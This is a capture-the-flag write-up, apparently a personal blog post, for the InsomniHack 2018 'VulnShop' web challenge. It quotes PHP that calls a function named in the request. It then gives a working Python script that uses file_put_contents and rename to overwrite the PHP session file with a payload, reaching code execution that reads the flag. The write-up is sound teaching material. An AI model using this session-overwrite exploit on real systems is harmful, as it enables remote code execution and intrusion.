---
layout: post
title:  "Remote Code Execution via Session - InsomniHack Teaser 2018"
subtitle: 'InsomniHack 2018 Vulnshop Web Challenge'
date:   2018-01-21 00:06:31
tags:
- Web, CTF, PHP-RCE
---


This year's Insomni'Hack had pretty much decent challenges even though it took some time before my team could solve. The first challenge being, `VulnShop`. A pretty straightforward description with a few functionalities in the page along with the source code made it neat and clean.

<figure class="foto-legenda">
	<img src="../assets/writeup2/firstpage" alt="">
</figure>


Going through the source code, two particular function caught my attention: `captcha` and `captcha-verify`.

{% highlight php %}
case 'contactus':
  echo "<p>You can't contact us for the moment, but it will be available later.</p>";
  $\_SESSION['challenge'] = rand(100000,999999);
  break;
case 'captcha':
  if(isset($\_SESSION['challenge'])) echo $\_SESSION['challenge'];
  // Will make an image later
    touch($\_SESSION['challenge']);
    break;
case 'captcha-verify':
// verification functions take a file for later, when we'll provide more way of verification
  function verifyFromString($file, $response) {
  if($\_SESSION['challenge'] === $response) return true;
  else return false;
 }  
{% endhighlight %}

The `$_SESSION['challenge']` does something very interesting which is basically creating a file after calling the `contactus` page
which basically stores a random number between the specified value and in return requesting for `captcha` creates a file with the same generated number.

<figure class="foto-legenda">
	<img src="../assets/writeup2/filecreation" alt="">
</figure>


Let that be pretty much and let's move ahead in the source code. The very next piece of code,

{% highlight php %}
if(isset($\_REQUEST['answer']) && isset($\_REQUEST['method']) && function_exists($\_REQUEST['method'])){
    $\_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']);
}
{% endhighlight %}

we can see how the request is made, mainly two parameters as `GET` request.

The next part is the main aim of getting the flag. So according to the description and what we understood from the source code, what we can do is, we will make it into 3 steps:
1) Create a file by calling `contactus` and `captcha`
2) Write whatever we want to the file, say `123456`
3) Copy the contents of that particular file to the session variable
4) Execute it

Also there were a few function which were disabled that could be seen in `phpinfo`:

<figure class="foto-legenda">
	<img src="../assets/writeup2/disabled_func" alt="">
</figure>


The script below does all in one go:

{% highlight python %}
#Author gkrishna
#Member of Teambi0s
#insomnihack_teaser 2018
import sys
import requests

url = "http://vulnshop.teaser.insomnihack.ch/"
s = requests.Session()

s.get(url+"?page=contactus")
s.get(url+"?page=captcha")
r = s.get(url+'?page=captcha-verify&method=file_put_contents&answer=challenge|s:35:"print_r(file_get_contents(\'/flag\'))";')
s.cookies.get_dict()['PHPSESSID']
val = "Value of Cookie = " + s.cookies.get_dict()['PHPSESSID']

s.get(url+"?page=captcha-verify&method=rename&answer=/var/lib/php/sessions/sess_"+s.cookies.get_dict()['PHPSESSID'])
r = s.get(url+"?page=captcha-verify&method=verifyFromMath&answer=1")

print r.text
{% endhighlight %}

Towards the end, we call the function `verifyFromMath` which returns the desired string.

Catch me in <a href="https://twitter.com/gkgkrishna33">Twitter</a>.
